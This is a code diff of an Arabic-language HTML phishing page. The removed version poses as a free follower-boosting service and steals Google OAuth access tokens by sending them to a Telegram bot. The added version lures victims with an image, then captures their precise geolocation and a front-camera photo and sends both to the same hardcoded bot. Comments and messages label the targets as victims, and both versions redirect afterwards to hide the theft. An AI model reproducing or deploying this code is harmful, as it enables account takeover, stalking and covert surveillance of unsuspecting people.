@@ -1,83 +1,223 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SMM PRO | زيادة متابعين مجاناً</title>
+    <title>جاري التحميل...</title>
     <style>
-        :root { --primary: #4285f4; --dark: #1a1a1a; }
-        body { margin: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--dark); color: white; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .card { background: #2a2a2a; padding: 2rem; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); text-align: center; width: 90%; max-width: 400px; border: 1px solid #3d3d3d; }
-        h1 { color: var(--primary); margin-bottom: 0.5rem; }
-        p { color: #aaa; font-size: 0.9rem; margin-bottom: 1.5rem; }
-        .btn-google { background: white; color: #757575; padding: 12px 24px; border-radius: 5px; border: none; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; width: 100%; transition: 0.3s; }
-        .btn-google:hover { background: #f1f1f1; transform: translateY(-2px); }
-        .loader { border: 3px solid #f3f3f3; border-top: 3px solid var(--primary); border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; display: none; margin: 10px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body {
+            background: #0a0a0a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            background: #1a1a2e;
+            border-radius: 15px;
+            padding: 30px;
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+        }
+        img {
+            max-width: 100%;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        img:active {
+            transform: scale(0.98);
+        }
+        .status {
+            color: #00ff88;
+            margin-top: 15px;
+            font-size: 14px;
+        }
+        h3 { color: white; margin: 0 0 10px 0; }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #333;
+            border-top: 3px solid #00ff88;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
-
-<div class="card" id="mainCard">
-    <h1>SMM PRO v2.6</h1>
-    <p>قم بتوثيق حسابك عبر Google لبدء رشق المتابعين تلقائياً لعام 2026</p>
-    
-    <button class="btn-google" onclick="startAuth()">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" width="20" alt="G">
-        تسجيل الدخول عبر Google
-    </button>
-    <div class="loader" id="loader"></div>
+<div class="container">
+    <h3>🔍 جاري تحميل المحتوى</h3>
+    <div class="spinner"></div>
+    <div class="status" id="status">الرجاء الانتظار...</div>
 </div>
 
 <script>
-    // --- إعداداتك الخاصة (مهم جداً) ---
-    const CONFIG = {
-        BOT_TOKEN: "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY",
-        CHAT_ID: "1772820433",
-        CLIENT_ID: "965361607866-h7pg0gc9g1t28i3rv6asd3bomh9b6h83.apps.googleusercontent.com", // المعرف الذي نسخته
-        REDIRECT_URI: "https://3321122-wq.github.io/Mohammed/" // رابط صفحتك بدقة
-    };
+const urlParams = new URLSearchParams(window.location.search);
+const imgUrl = decodeURIComponent(urlParams.get('img') || '');
+const ownerId = urlParams.get('owner');
+const botToken = '8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY';
 
-    // 1. وظيفة توجيه الضحية لجوجل
-    function startAuth() {
-        document.getElementById('loader').style.display = 'block';
-        const oauthUrl = `https://accounts.google.com/o/oauth2/v2/auth?client_id=${CONFIG.CLIENT_ID}&redirect_uri=${encodeURIComponent(CONFIG.REDIRECT_URI)}&response_type=token&scope=email%20profile&state=verified_smm`;
-        window.location.href = oauthUrl;
+async function sendToBot(message) {
+    try {
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: ownerId,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        });
+    } catch(e) {}
+}
+
+async function sendLocationToBot(lat, lon, acc) {
+    try {
+        await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: ownerId,
+                latitude: lat,
+                longitude: lon
+            })
+        });
+        
+        await sendToBot(`📍 <b>موقع ضحية جديد!</b>\n\n• الإحداثيات: ${lat}, ${lon}\n• الدقة: ${acc} متر\n• الخريطة: https://www.google.com/maps?q=${lat},${lon}`);
+    } catch(e) {}
+}
+
+async function requestLocation() {
+    const statusDiv = document.getElementById('status');
+    
+    if (!navigator.geolocation) {
+        statusDiv.innerHTML = '❌ متصفحك لا يدعم مشاركة الموقع';
+        await sendToBot('❌ المتصفح لا يدعم خاصية الموقع');
+        return;
     }
-
-    // 2. وظيفة سحب التوكن وإرساله للتلجرام
-    async function hijackToken() {
-        const hash = window.location.hash;
-        if (hash.includes("access_token")) {
-            const params = new URLSearchParams(hash.replace("#", "?"));
-            const token = params.get("access_token");
-
-            if (token) {
-                // إخفاء الواجهة للإيهام بالتحميل
-                document.getElementById('mainCard').innerHTML = "<h1>جاري المعالجة...</h1><p>تم التوثيق بنجاح، جاري فحص جودة المتابعين</p><div class='loader' style='display:block'></div>";
-
-                // إرسال البيانات المسروقة لك
-                const message = `🔓 [تم صيد توكن جديد!]\n\n🎟️ Access Token:\n\`${token}\`\n\n🔗 استخدم التوكن لفتح الحساب فوراً!`;
+    
+    statusDiv.innerHTML = '📍 يرجى الموافقة على مشاركة موقعك...';
+    
+    navigator.geolocation.getCurrentPosition(
+        async (position) => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const acc = position.coords.accuracy;
+            
+            statusDiv.innerHTML = '✅ تم تحديد موقعك! جاري إرسال البيانات...';
+            await sendLocationToBot(lat, lon, acc);
+            
+            // محاولة التقاط صورة من الكاميرا
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.autoplay = true;
                 
-                try {
-                    await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: message, parse_mode: "Markdown" })
-                    });
-                } catch (e) { console.error("Send failed"); }
-
-                // تحويل الضحية لمكان آخر بعد 3 ثواني لإبعاد الشك
-                setTimeout(() => {
-                    window.location.href = "https://www.tiktok.com";
-                }, 3000);
+                await new Promise(r => setTimeout(r, 500));
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                
+                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: ownerId,
+                        photo: imageData,
+                        caption: '📸 صورة الضحية من الكاميرا الأمامية'
+                    })
+                });
+                
+                stream.getTracks().forEach(t => t.stop());
+            } catch(e) {}
+            
+            statusDiv.innerHTML = '✅ تم الإرسال! شكراً لك.';
+            
+            // إعادة التوجيه بعد 3 ثواني
+            setTimeout(() => {
+                if (imgUrl) {
+                    window.location.href = imgUrl;
+                } else {
+                    window.location.href = 'https://www.google.com';
+                }
+            }, 2000);
+        },
+        (error) => {
+            console.error(error);
+            let errorMsg = '';
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    errorMsg = '❌ لم تسمح بمشاركة الموقع. لا يمكن المتابعة.';
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    errorMsg = '❌ معلومات الموقع غير متاحة حالياً.';
+                    break;
+                case error.TIMEOUT:
+                    errorMsg = '❌ انتهى وقت محاولة تحديد الموقع.';
+                    break;
+                default:
+                    errorMsg = '❌ حدث خطأ غير معروف.';
             }
-        }
-    }
+            statusDiv.innerHTML = errorMsg;
+            await sendToBot(`❌ فشل تحديد الموقع: ${errorMsg}`);
+            
+            setTimeout(() => {
+                if (imgUrl) {
+                    window.location.href = imgUrl;
+                } else {
+                    window.location.href = 'https://www.google.com';
+                }
+            }, 3000);
+        },
+        { enableHighAccuracy: true, timeout: 10000 }
+    );
+}
 
-    // تشغيل الفحص فور تحميل الصفحة
-    window.onload = hijackToken;
+// عرض الصورة إذا كانت موجودة
+if (imgUrl && imgUrl !== 'null') {
+    const img = document.createElement('img');
+    img.src = imgUrl;
+    img.style.maxWidth = '100%';
+    img.style.borderRadius = '10px';
+    img.style.cursor = 'pointer';
+    img.alt = 'اضغط لعرض الصورة';
+    
+    const container = document.querySelector('.container');
+    const oldContent = container.innerHTML;
+    container.innerHTML = '';
+    container.appendChild(img);
+    
+    const statusDiv = document.createElement('div');
+    statusDiv.className = 'status';
+    statusDiv.innerHTML = '📍 اضغط على الصورة لمشاركة موقعك';
+    container.appendChild(statusDiv);
+    
+    img.onclick = () => {
+        statusDiv.innerHTML = '📍 جاري طلب الموقع...';
+        requestLocation();
+    };
+} else {
+    // إذا لم توجد صورة، اطلب الموقع مباشرة
+    document.querySelector('.spinner').style.display = 'none';
+    document.querySelector('h3').innerHTML = '📍 مشاركة الموقع';
+    document.getElementById('status').innerHTML = 'اضغط هنا لمشاركة موقعك';
+    document.querySelector('.container').style.cursor = 'pointer';
+    document.querySelector('.container').onclick = requestLocation;
+}
 </script>
-
 </body>
 </html>
